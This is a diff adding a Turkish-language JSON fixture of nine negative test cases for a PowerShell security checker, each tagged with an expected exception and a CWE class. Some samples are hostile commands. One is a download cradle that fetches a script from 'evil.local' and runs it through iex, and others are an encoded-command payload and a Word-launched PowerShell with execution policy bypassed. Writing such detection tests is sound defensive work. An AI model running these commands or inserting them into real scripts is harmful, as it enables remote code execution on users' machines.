@@ -1,0 +1,68 @@
+{
+  "aciklama": "G085: PowerShell nesne boru hatti ve betik guvenlik denetimi icin 9 adet negatif kontrol senaryosu.",
+  "negatif_testler": [
+    {
+      "test_id": "NEG_01_IEX_COMMAND_INJECTION",
+      "baslik": "Boru Hattinda Invoke-Expression (IEX) Dinamik Kod Calistirma Enjeksiyonu",
+      "beklenen_hata": "DangerousPipelineInvocationException",
+      "zafiyet_turu": "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code",
+      "betik": "$userInput | Invoke-Expression"
+    },
+    {
+      "test_id": "NEG_02_OBFUSCATED_BASE64_EXECUTION",
+      "baslik": "Boru Hatti Parametresinde Gizlenmis (Obfuscated) Base64 Komut Calistirma",
+      "beklenen_hata": "ObfuscatedPayloadDetectedException",
+      "zafiyet_turu": "CWE-116: Improper Encoding or Escaping of Output",
+      "betik": "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
+    },
+    {
+      "test_id": "NEG_03_UNQUOTED_SERVICE_PATH",
+      "baslik": "Servis Boru Hattinda Tirnak Icine Alinmamis Bosluklu Servis Yolu",
+      "beklenen_hata": "UnquotedServicePathException",
+      "zafiyet_turu": "CWE-428: Unquoted Search Path or Element",
+      "betik": "C:\\Program Files\\Insecure Service\\daemon.exe -k run"
+    },
+    {
+      "test_id": "NEG_04_DOWNLOAD_CRADLE_PIPELINE",
+      "baslik": "Boru Hattinda Ag Uzerinden Indir ve Calistir (Download Cradle)",
+      "beklenen_hata": "DownloadCradleDetectedException",
+      "zafiyet_turu": "CWE-829: Inclusion of Functionality from Untrusted Control Sphere",
+      "betik": "(New-Object System.Net.WebClient).DownloadString('http://evil.local/p.ps1') | iex"
+    },
+    {
+      "test_id": "NEG_05_OVERSIZED_PIPELINE_BOMB_DOS",
+      "baslik": "Asiri Nesne Uretimi ile Bellek Tukenmesi (Pipeline Bomb DoS)",
+      "beklenen_hata": "PipelineObjectLimitExceededException",
+      "zafiyet_turu": "CWE-400: Uncontrolled Resource Consumption",
+      "betik": "OVERSIZED_PIPELINE_MARKER"
+    },
+    {
+      "test_id": "NEG_06_NULL_BYTE_IN_SCRIPT_OR_NAME",
+      "baslik": "Boru Hatti Nesnesinde veya Betikte Null-Byte (0x00) Enjeksiyonu",
+      "beklenen_hata": "NullByteForbiddenException",
+      "zafiyet_turu": "CWE-158: Improper Neutralization of Null Byte or Special Characters",
+      "betik": "Get-Process\u0000 | Stop-Process"
+    },
+    {
+      "test_id": "NEG_07_SUSPICIOUS_PARENT_CHILD_ANOMALY",
+      "baslik": "Ofis veya Tarayici Tarafindan Baslatilan Supheli PowerShell Sureci",
+      "beklenen_hata": "AnomalousProcessLineageException",
+      "zafiyet_turu": "CWE-250: Execution with Unnecessary Privileges / LOLBins Execution",
+      "betik": "Parent: WINWORD.EXE -> Child: powershell.exe -ExecutionPolicy Bypass"
+    },
+    {
+      "test_id": "NEG_08_MALFORMED_PIPELINE_SYNTAX",
+      "baslik": "Bozuk veya Gecersiz Boru Hatti Sozdizimi (Bos Pipe Segmenti)",
+      "beklenen_hata": "MalformedPipelineSyntaxException",
+      "zafiyet_turu": "CWE-20: Improper Input Validation",
+      "betik": "Get-Process | | Where-Object { $_.Id -gt 100 } |"
+    },
+    {
+      "test_id": "NEG_09_INVALID_IP_SOCKET_IN_PIPELINE",
+      "baslik": "Ag Baglanti Nesnesinde Gecersiz IP Adresi (Bozuk Nesne)",
+      "beklenen_hata": "InvalidPipelineSocketException",
+      "zafiyet_turu": "CWE-20: Improper Input Validation for Network Entities",
+      "betik": "LocalAddress: 999.999.999.999, Port: 80"
+    }
+  ]
+}
